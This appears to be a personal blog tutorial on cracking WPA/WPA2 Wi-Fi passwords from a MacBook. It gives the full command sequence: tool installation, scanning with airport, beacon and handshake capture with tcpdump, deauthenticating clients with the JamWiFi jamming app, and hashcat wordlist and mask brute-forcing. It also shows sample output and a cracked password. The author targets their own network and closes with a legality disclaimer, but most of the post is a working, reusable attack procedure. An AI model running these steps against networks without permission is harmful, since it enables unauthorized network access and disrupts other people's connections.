title: Hacking. Wi-Fi Penetration on MacOS
excerpt: >-
  Today I want to show how to crack WPA/WPA2 passwords on MacOS.
  It took me 20 minutes to hack a password with 8 digits.
  My methods based on airport, aircrack-ng, tcpdump, wireshark, hashcat and some other software.

A wireless network with WPA/WPA security not guarantee a total safety.
WiFi packets could be sniffed by an attacker that can stole a WiFi passwords, then he connects to your secured network.
But he is need to decode a hash of password. The complexity and time to get a password phrase completely depends on the password. Passwords consists only digits cracks minutes or hours, the password *"HasGUS%f@$SAfga63efSA%$S(SACSASj)"* require a hundred years to crack it.

MacOS isn't known as an ideal operating system for hacking without customization, but it includes native tools that allow easy control of the Wi-Fi radio for packet sniffing. Changing channels, scanning for access points, and even capturing packets all can be done from the command line.

This manual show a manual to crack WiFi password from my MacBook Pro with MacOS 10.13 (HighSierra).
I want to save the instruction to the future. If you want to repeat it you should familiar with console terminal.

Let's start cracking ;)

## installation requirements

1. Install [Homebrew](https://brew.sh/)

2. Install [aircrack-ng][aircrack]
```
brew install aircrack-ng
```

3. Generate a link of the next installed by built-in utility - **airport** for using directly on terminal.
```
sudo ln -s /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport /usr/local/bin/airport
```

4. Install [hashcat][hashcat]
```
brew install hashcat
```

5. Install [hashcat-utils](https://github.com/hashcat/hashcat-utils). Build from sources. Use git and gcc
```
git clone https://github.com/hashcat/hashcat-utils.git
cd hashcat-utils/src
gcc -o cap2hccapx cap2hccapx.c
mv ./cap2hccapx /usr/local/bin/
```

6. Install [hcxtools][hcxtools]
```
brew install hcxtools
```

7. Install [wireshark][wireshark]
```
brew install wireshark
```

8. Install [JamWifi](https://github.com/0x0XDev/JamWiFi) app. It is a deauthenticating application in which unwanted clients from a Wi-Fi network have to keep off, jamming and especially their connection will be departed like dust in a second. Download and unzip by [this][jamwifi] link.

9. Test that all tools installed and available. The commands below should success return some help page about itself:
```
airport -h
aircrack-ng --help
cap2hccapx -h
hashcat -h
hcxhash2cap -h
tcpdump -h
wireshark -h
```

## identify the target access point

> About the abbreviation
> - Basic Service Set Identifier (BSSID).
> - Service Set Identifier (SSID).
> - Radio Frequency (Channel).
> - Access Point (AP).

1. Turn on Wi-Fi.

2. Open Terminal.

3. Run a command
```
sudo airport -s
```
Now, this command will be scanning the available Wi-Fi.

4. Wait till the installation is done.
[![available-networks]({{ site.baseurl }}/assets/images/wifi-crack/airport-scan.png)]({{ site.baseurl }}/assets/images/wifi-crack/airport-scan.png){: .align-center}
I want to hack my network named `Ruslan Gainanov` and **BSSID** `6e:57:ca:24:09:8c` and **channel** `1`.

5. Copy the BSSID (my BSSID=`6e:57:ca:24:09:8c`) of the target Access Point.
```
export BSSID=6e:57:ca:24:09:8c
```

## capturing a traffic

1. Run a command to help find a wireless interface (`en0`)
```
networksetup -listallhardwareports
```
The result:
```
Hardware Port: Wi-Fi
Device: en0
Ethernet Address: .......
```

2. Disassociate a network
```
sudo airport -z
```

3. Set the channel. Do not put a space between `-c` and the channel
```
sudo airport -c1
```

4. Capture a **beacon** frame from the access point. This command will create a new file `beacon.cap`, which is the gathered data from the target access point.
```
sudo tcpdump "type mgt subtype beacon and ether src $BSSID" -I -c 1 -i en0 -w beacon.cap
```

5. Deauth connected devices with **Jam Wi-Fi** app. Open the app. Press **Scan**, chose the target network and press **Monitor**, then press **Do It!** to restart all connections. Wait 15 seconds and press **Done**
[![deauth-clients]({{ site.baseurl }}/assets/images/wifi-crack/jamwifi.png)]({{ site.baseurl }}/assets/images/wifi-crack/jamwifi.png){: .align-center}

6. When you "Done" with death, run quickly next command. You have to capture a **handshake** in time
```
sudo tcpdump "ether proto 0x888e and ether host $BSSID" -I -U -vvv -i en0 -w handshake.cap
```
Wait until you see some gotten frames, like this
```
Got 19
```
After you have it press `"Control + C"` to stop capturing.

7. Merge the Beacon and Handshake
```
mergecap -a -F pcap -w capture.cap beacon.cap handshake.cap
```

## brute forcing
> - Brute Force — A brute-force attack consists of an attacker submitting many passwords or passphrases with the hope of eventually guessing correctly.
> - Wordlist — A written collection of all words derived from a particular source.

.1. Generating HCCPAX File
```
cap2hccapx capture.cap capture.hccapx
```
Hashcat doesn’t take cap files, only hccapx files. So we need convert this files. Other way to made it is use a [online tool](https://hashcat.net/cap2hccapx/).

Review the result. You should see the phrase `Networks detected: X... Written X WPA Handshakes`. The example of success result is:
```
Networks detected: 1
[*] BSSID=6e:57:ca:24:09:8c ESSID=Ruslan Gainanov (Length: 15)
--> STA=14:16:9e:67:7e:c5, Message Pair=0, Replay Counter=1
--> STA=14:16:9e:67:7e:c5, Message Pair=2, Replay Counter=1
--> STA=14:16:9e:67:7e:c5, Message Pair=0, Replay Counter=1
--> STA=14:16:9e:67:7e:c5, Message Pair=2, Replay Counter=1

Written 4 WPA Handshakes to: capture.hccapxn
```

.2. Now, everything are right to execute the **hashcat**. We can use a wordlist or a pattern to broke a password.
Using a wordlist (example of wordlists - https://github.com/kennyn510/wpa2-wordlists.git):
```
hashcat -m 2500 capture.hccapx wordlist.txt
```
Using a pattern - 8 digits:
```
hashcat -m 2500 -a3 capture.hccapx "?d?d?d?d?d?d?d?d"
```
For more examples press [here](https://hashcat.net/wiki/doku.php?id=cracking_wpawpa2). For more patterns, see the [documentation](https://hashcat.net/wiki/doku.php?id=mask_attack).

## my results

I use the hashcat with pattern, that works on GPU.
On my MacBook Pro, it yields a performance of 41kH/s: it tests 41000 passwords in a second.

Is true that my network named `Ruslan Gainanov` has a password - `12345670`.

## conclusion

Please be aware that attacking Wi-Fi Protected Access (WPA) is illegal unless you have permission from the owner’s access point or affiliation involved. This post should be used as Educational Purposes, to help the public understand how hackers take advantage of your access.
